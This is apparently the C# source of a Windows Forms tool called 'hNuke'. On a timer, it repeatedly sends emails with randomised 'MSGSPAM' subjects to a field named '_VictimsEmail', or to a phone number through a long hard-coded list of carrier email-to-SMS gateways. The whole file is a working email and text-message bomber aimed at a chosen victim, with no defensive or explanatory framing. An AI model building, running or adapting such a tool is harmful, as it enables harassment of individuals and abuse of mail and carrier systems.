using System.Net.Mail;

namespace hNuke
{
    public partial class Form1 : Form
    {
        Random _rng = new Random();
        string _SelectedCarrier;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            try
            {
                SmtpClient _smtpClient = new SmtpClient(_SmtpServer.Text);
                _smtpClient.Port = Convert.ToInt32(_SmptPort.Text);

                _smtpClient.Credentials = new System.Net.NetworkCredential(_EmailAddress.Text, _EmailPassword.Text);
                if (_UseSSL.Checked)
                {
                    _smtpClient.EnableSsl = true;
                }

                MailMessage _Message = new MailMessage(_EmailAddress.Text, _EmailAddress.Text);
                //_Message.Subject = "MSGSPAM" + _rng.Next(1, 99999);
                _Message.Subject = "Test Successful";
                _Message.Body = richTextBox1.Text;
                _smtpClient.Send(_Message);

            }
            catch (Exception)
            {
                MessageBox.Show("SMTP Error, modify settings, or check server configuration.");
            }

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            // _CooldownTimer.Interval = _CooldownSettings.Value * 60000;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _SendTimer.Start();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            _SendTimer.Stop();
        }

        private void _SendTimer_Tick(object sender, EventArgs e)
        {

            switch (_CarrierName.Text)
            {


                case "AT&T":
                    _SelectedCarrier = "@mms.att.net";
                    break;
                case "Verizon Wireless":
                    _SelectedCarrier = "@vzwpix.com";
                    break;
                case "T-Mobile":
                    _SelectedCarrier = "@tmomail.net";
                    break;
                case "Airfire Mobile":
                    _SelectedCarrier = "@sms.airfiremobile.com";
                    break;
                case "Alaska Communications":
                    _SelectedCarrier = "@msg.acsalaska.com";
                    break;
                case "Alltel (Allied Wireless)":
                    _SelectedCarrier = "@mms.alltelwireless.com";
                    break;
                case "Ameritech":
                    _SelectedCarrier = "@paging.acswireless.com";
                    break;
                case "Assurance Wireless":
                    _SelectedCarrier = "@vmobl.com";
                    break;
                case "Formerly Cingular":
                    _SelectedCarrier = "@txt.att.net";
                    break;
                case "BellSouth":
                    _SelectedCarrier = "@bellsouth.cl";
                    break;
                case "Bluegrass Cellular":
                    _SelectedCarrier = "@mms.myblueworks.com";
                    break;
                case "Boost Mobile":
                    _SelectedCarrier = "@myboostmobile.com";
                    break;
                case "Cellcom":
                    _SelectedCarrier = "@cellcom.quiktxt.com";
                    break;
                case "Cellular South":
                    _SelectedCarrier = "@csouth1.com";
                    break;
                case "Chariton Valley Wireless":
                    _SelectedCarrier = "@sms.cvalley.net";
                    break;
                case "Chat Mobility":
                    _SelectedCarrier = "@mail.msgsender.com";
                    break;
                case "Cincinnati Bell":
                    _SelectedCarrier = "@mms.gocbw.com";
                    break;
                case "Cingular (Postpaid)":
                    _SelectedCarrier = "@cingular.com";
                    break;
                case "Cleartalk":
                    _SelectedCarrier = "@sms.cleartalk.us";
                    break;
                case "Consumer Cellular":
                    _SelectedCarrier = "@cingularme.com";
                    break;
                case "Cricket":
                    _SelectedCarrier = "@sms.mycricket.com";
                    break;
                case "C Spire Wireless":
                    _SelectedCarrier = "@cspire1.com";
                    break;
                case "DTC _SelectedCarrier":
                    _SelectedCarrier = "@sms.advantagecell.net";
                    break;
                case "Edge Wireless":
                    _SelectedCarrier = "@sms.edgewireless.com";
                    break;
                case "Element Mobile":
                    _SelectedCarrier = "@SMS.elementmobile.net";
                    break;
                case "Esendex":
                    _SelectedCarrier = "@echoemail.net";
                    break;
                case "General Communications Inc.":
                    _SelectedCarrier = "@mobile.gci.net";
                    break;
                case "Golden State Cellular":
                    _SelectedCarrier = "@gscsms.com";
                    break;
                case "Greatcall":
                    _SelectedCarrier = "@vtxt.com";
                    break;
                case "Hawaiian Telcom Wireless":
                    _SelectedCarrier = "@hawaii.sprintpcs.com";
                    break;
                case "Helio _SelectedCarrier":
                    _SelectedCarrier = "@myhelio.com";
                    break;
                case "i-wireless (Sprint PC":
                    _SelectedCarrier = "@iwirelesshometext.com";
                    break;
                case "Kajeet":
                    _SelectedCarrier = "@mobile.kajeet.net";
                    break;
                case "LongLines":
                    _SelectedCarrier = "@text.longlines.com";
                    break;
                case "MetroPCS":
                    _SelectedCarrier = "@mymetropcs.com";
                    break;
                case "Nextech":
                    _SelectedCarrier = "@sms.ntwls.net";
                    break;
                case "Page Plust Cellular (V MVNO)":
                    _SelectedCarrier = "@mypixmessages.com";
                    break;
                case "Pocket Wireless":
                    _SelectedCarrier = "@sms.pocket.com";
                    break;
                case "Qwest Wireless":
                    _SelectedCarrier = "@qwestmp.com";
                    break;
                case "Red Pocket Mobile":
                    _SelectedCarrier = "@txt.att.net";
                    break;
                case "Simple Mobile":
                    _SelectedCarrier = "@smtext.com";
                    break;
                case "Southernlinc":
                    _SelectedCarrier = "@page.southernlinc.com";
                    break;
                case "South Central Communication":
                    _SelectedCarrier = "@rinasms.com";
                    break;
                case "Sprint":
                    _SelectedCarrier = "@messaging.sprintpcs.com";
                    break;
                case "Straight Talk":
                    _SelectedCarrier = "@vtext.com";
                    break;
                case "Solavei":
                    _SelectedCarrier = "@tmomail.net";
                    break;
                case "Syringa Wireless":
                    _SelectedCarrier = "@rinasms.com";
                    break;
                case "Teleflip":
                    _SelectedCarrier = "@teleflip.com";
                    break;
                case "TracFone (prepaid)":
                    _SelectedCarrier = "@mmst5.tracfone.com";
                    break;
                case "Unicel":
                    _SelectedCarrier = "@utext.com";
                    break;
                case "US Cellular":
                    _SelectedCarrier = "@mail.uscc.net";
                    break;
                case "USA Mobility":
                    _SelectedCarrier = "@usamobility.net";
                    break;
                case "Viaro":
                    _SelectedCarrier = "@viaerosms.com";
                    break;
                case "Virgin Mobile":
                    _SelectedCarrier = "@vxtras.com";
                    break;
                case "Voyager Mobile":
                    _SelectedCarrier = "@text.voyagermobile.com";
                    break;
                case "West Central Wireless":
                    _SelectedCarrier = "@sms.wcc.net";
                    break;
                case "XIT Communications":
                    _SelectedCarrier = "@sms.xit.net";

                    break;
                default:
                    break;
            }
            if (_SetDelay.Checked)
            {
                System.Threading.Thread.Sleep(Convert.ToInt32(_DelayTime.Text));

                if (_EmailSelect.Checked)
                {
                    _PhoneSelect.Enabled = false;
                    _EmailSelect.Enabled = true;
                    _CarrierName.Enabled = false;
                    _PhoneNumber.Enabled = false;
                    try
                    {
                        SmtpClient _smtpClient = new SmtpClient(_SmtpServer.Text);
                        _smtpClient.Port = Convert.ToInt32(_SmptPort.Text);

                        _smtpClient.Credentials = new System.Net.NetworkCredential(_EmailAddress.Text, _EmailPassword.Text);
                        if (_UseSSL.Checked)
                        {
                            _smtpClient.EnableSsl = true;
                        }

                        MailMessage _Message = new MailMessage(_EmailAddress.Text, _VictimsEmail.Text);
                        _Message.Subject = "MSGSPAM" + _rng.Next(1, 99999);
                        // _Message.Subject = "Test Successful";
                        _Message.Body = richTextBox1.Text;
                        _smtpClient.Send(_Message);

                    }
                    catch (Exception)
                    {
                        MessageBox.Show("SMTP Error, modify settings, or check server configuration.");
                    }
                }
                else if (_PhoneSelect.Checked)
                {

                    try
                    {
                        SmtpClient _smtpClient = new SmtpClient(_SmtpServer.Text);
                        _smtpClient.Port = Convert.ToInt32(_SmptPort.Text);

                        _smtpClient.Credentials = new System.Net.NetworkCredential(_EmailAddress.Text, _EmailPassword.Text);
                        if (_UseSSL.Checked)
                        {
                            _smtpClient.EnableSsl = true;
                        }

                        MailMessage _Message = new MailMessage(_EmailAddress.Text, _PhoneNumber.Text + _SelectedCarrier);
                        _Message.Subject = "MSGSPAM" + _rng.Next(1, 99999);
                        // _Message.Subject = "Test Successful";
                        _Message.Body = richTextBox1.Text;
                        _smtpClient.Send(_Message);
                    }
                    catch (Exception)
                    {

                        MessageBox.Show("SMTP Error, modify settings, or check server configuration.");
                    }
                }
            }
            else
            {

                if (_EmailSelect.Checked)
                {
                    _PhoneSelect.Enabled = false;
                    _EmailSelect.Enabled = true;
                    _CarrierName.Enabled = false;
                    _PhoneNumber.Enabled = false;
                    try
                    {
                        SmtpClient _smtpClient = new SmtpClient(_SmtpServer.Text);
                        _smtpClient.Port = Convert.ToInt32(_SmptPort.Text);

                        _smtpClient.Credentials = new System.Net.NetworkCredential(_EmailAddress.Text, _EmailPassword.Text);
                        if (_UseSSL.Checked)
                        {
                            _smtpClient.EnableSsl = true;
                        }

                        MailMessage _Message = new MailMessage(_EmailAddress.Text, _VictimsEmail.Text);
                        _Message.Subject = "MSGSPAM" + _rng.Next(1, 99999);
                        // _Message.Subject = "Test Successful";
                        _Message.Body = richTextBox1.Text;
                        _smtpClient.Send(_Message);

                    }
                    catch (Exception)
                    {
                        MessageBox.Show("SMTP Error, modify settings, or check server configuration.");
                    }
                }
                else if (_PhoneSelect.Checked)
                {
                    try
                    {
                        SmtpClient _smtpClient = new SmtpClient(_SmtpServer.Text);
                        _smtpClient.Port = Convert.ToInt32(_SmptPort.Text);

                        _smtpClient.Credentials = new System.Net.NetworkCredential(_EmailAddress.Text, _EmailPassword.Text);
                        if (_UseSSL.Checked)
                        {
                            _smtpClient.EnableSsl = true;
                        }

                        MailMessage _Message = new MailMessage(_EmailAddress.Text, _PhoneNumber.Text + _SelectedCarrier);
                        _Message.Subject = "MSGSPAM" + _rng.Next(1, 99999);
                        // _Message.Subject = "Test Successful";
                        _Message.Body = richTextBox1.Text;
                        _smtpClient.Send(_Message);
                    }
                    catch (Exception)
                    {

                        MessageBox.Show("SMTP Error, modify settings, or check server configuration.");
                    }
                }
            }








        }

        /*     private void _CooldownTimer_Tick(object sender, EventArgs e)
             {

             }
        */
        private void _PhoneSelect_CheckedChanged(object sender, EventArgs e)
        {

            if (_PhoneSelect.Checked)
            {
                _PhoneSelect.Enabled = true;
                _EmailSelect.Enabled = false;
                _CarrierName.Enabled = true;
                _PhoneNumber.Enabled = true;
                _VictimsEmail.Enabled = false;
            }
            else if (!_PhoneSelect.Checked)
            {
                _PhoneSelect.Enabled = true;
                _EmailSelect.Enabled = true;
                _CarrierName.Enabled = false;
                _PhoneNumber.Enabled = false;
                _VictimsEmail.Enabled = false;
            }
        }

        private void _EmailSelect_CheckedChanged(object sender, EventArgs e)
        {
            if (_EmailSelect.Checked)
            {
                _PhoneSelect.Enabled = false;
                _EmailSelect.Enabled = true;
                _CarrierName.Enabled = false;
                _VictimsEmail.Enabled = true;
            }
            else if (!_EmailSelect.Checked)
            {
                _PhoneSelect.Enabled = true;
                _EmailSelect.Enabled = true;
                _CarrierName.Enabled = false;
                _PhoneNumber.Enabled = false;
                _VictimsEmail.Enabled = false;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                _SendTimer.Interval = Convert.ToInt32(_SetInterval.Text);
            }
            catch (Exception)
            {

                MessageBox.Show("Timer interval must be an integer.");

            }
        }
    }
}